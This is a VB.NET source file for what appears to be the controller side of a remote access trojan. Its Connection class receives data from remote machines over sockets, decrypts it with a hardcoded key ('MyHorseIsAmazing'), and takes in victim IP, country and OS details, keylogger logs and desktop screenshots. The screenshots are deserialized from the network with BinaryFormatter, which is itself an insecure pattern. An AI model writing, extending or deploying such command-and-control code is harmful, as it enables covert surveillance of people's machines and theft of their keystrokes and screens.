Imports System.Text
Imports System.Net
Imports System.Net.Sockets
Imports System.IO
Imports System.Runtime.Serialization
Imports System.Runtime.Serialization.Formatters.Binary
Public Class Connection
    Dim password() As Byte = Encoding.ASCII.GetBytes("MyHorseIsAmazing")
    Dim socket As Socket = Nothing
    Dim tran As Socket = Nothing
    Dim endPoint As IPEndPoint = Nothing
    Public Property IPAddress As IPAddress
    Sub New(ByVal sck As Socket, ByVal tranSock As Socket)
        Try
            socket = sck
            tran = tranSock
            IPAddress = Net.IPAddress.Parse(socket.RemoteEndPoint.ToString().Split(":")(0))
            tran.ReceiveBufferSize = 5242880
            tran.SendBufferSize = tran.ReceiveBufferSize
            tran.BeginReceive(New Byte() {0}, 0, 0, SocketFlags.None, AddressOf Receive, Nothing)
        Catch ex As Exception
            Log(ex.Message)
            Return
        End Try
    End Sub
    Private Sub Receive(ByVal ar As IAsyncResult)
        Try
            If (tran.Connected And tran.Available > 0) Then
                Dim arr(tran.ReceiveBufferSize) As Byte
                Dim read As Integer = tran.Receive(arr)
                Array.Resize(arr, read)
                Parse(arr)
                tran.BeginReceive(New Byte() {0}, 0, 0, SocketFlags.None, AddressOf Receive, Nothing)
            Else
                Throw New Exception("Disconnected")
            End If
        Catch ex As Exception
            Log(ex.Message + " - Re")
            RaiseEvent Disconnected(Me, New EventArgs())
        End Try
    End Sub
    Private Sub Parse(ByVal bytes() As Byte)
        Try
                Log(bytes.Length & " - Parse B Len")
                Dim i As New InfoReader(bytes, password)
                Dim header As String = i.ReadLine(0)
            Log(header & " - Header")
                Select Case header
                    Case "CONNECTED"
                        RaiseEvent Connected(Me, New ConnectedEventArgs(New Object() {IPAddress.Parse(socket.RemoteEndPoint.ToString().Split(":")(0)), _
                                                                                      i.ReadLine(1), i.ReadLine(2)}))
                    Case "STATUS"
                        RaiseEvent StatusChanged(Me, New StatusChangedEventArgs(i.ReadLine(1)))
                Case "KEYLOGGER"
                    RaiseEvent LogReceived(Me, New LogRecievedEventArgs(i.ReadLine(1)))
                Case "DESKTOP"
                    Dim ns As New NetworkStream(tran)
                    Threading.Thread.Sleep(2000)
                    Dim bf As New BinaryFormatter()
                    Dim img As Image = DirectCast(bf.Deserialize(ns), Image)
                    RaiseEvent ImageReceived(Me, img)
                    ns.Flush()
            End Select
            Catch ex As Exception
                Log(ex.Message & " Parse")
            End Try
    End Sub
    Public Sub Close()
        Try
            socket.Disconnect(False)
            socket.Close()
            tran.Disconnect(False)
            tran.Close()
        Catch : End Try
    End Sub
    Public Sub Send(ByVal bytes() As Byte)
        SyncLock (tran)
            If (tran.Connected) Then
                tran.Send(bytes)
            End If
        End SyncLock
    End Sub
    Sub Log(ByVal str As String)
        Console.WriteLine(str)
    End Sub
    Public Event Connected(ByVal sender As Connection, ByVal e As ConnectedEventArgs)
    Public Event Disconnected(ByVal sender As Connection, ByVal e As EventArgs)
    Public Event StatusChanged(ByVal sender As Connection, ByVal e As StatusChangedEventArgs)
    Public Event ImageReceived(ByVal sender As Connection, ByVal e As Image)
    Public Event LogReceived(ByVal sender As Connection, ByVal e As LogRecievedEventArgs)
End Class
Public Class ReceivedInformationEventArgs
    Public Property dataBytes As Byte()
    Public Property infoReader As InfoReader
    Sub New(ByVal bytes() As Byte, ByRef infoReader As InfoReader)
        Me.dataBytes = bytes
        Me.infoReader = infoReader
    End Sub
End Class
Public Class StatusChangedEventArgs
    Public Property CurrentStatus As String
    Sub New(ByVal stat As String)
        CurrentStatus = stat
    End Sub
End Class
Public Class ConnectedEventArgs
    Public Property IPAddress As IPAddress
    Public Property OperatingSystem As String
    Public Property Country As String
    Sub New(ByVal obj() As Object)
        IPAddress = DirectCast(obj(0), IPAddress)
        Country = obj(1).ToString()
        OperatingSystem = obj(2).ToString()
    End Sub
End Class
Public Class LogRecievedEventArgs
    Public Property Log As String
    Sub New(ByVal e As String)
        Log = e.Replace("[NEWLINE]", Environment.NewLine)
    End Sub
End Class